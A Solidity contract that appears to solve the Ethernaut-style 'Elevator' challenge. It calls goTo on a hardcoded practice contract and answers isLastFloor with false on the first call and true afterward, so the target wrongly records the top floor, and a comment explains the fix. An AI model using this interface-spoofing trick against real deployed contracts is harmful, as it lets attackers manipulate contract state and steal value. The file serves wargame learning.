// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.15;

/** 
    @title Hacker contract for Elevator
    @notice The return value of isLastFloor is modified to meet the requirements of getting to the top floor.
            To prevent this attack, the Building interface should add view/pure to the isLastFloor 
            such that someone who's imitating the interface can't do state modifications.
*/

interface Elevator {
    function goTo(uint _floor) external;  
}

contract HackElevator {
    Elevator toHack = Elevator(0x9A033b03bf530c27e5ce5746Afe70325e66e13C0);
    uint called;

    function goToLastFloor(uint _floor) external {
        toHack.goTo(_floor);
    }

    function isLastFloor(uint) external returns (bool) {
        ++called;
        if (called == 1) {
            return false;
        }
        return true;
    }
}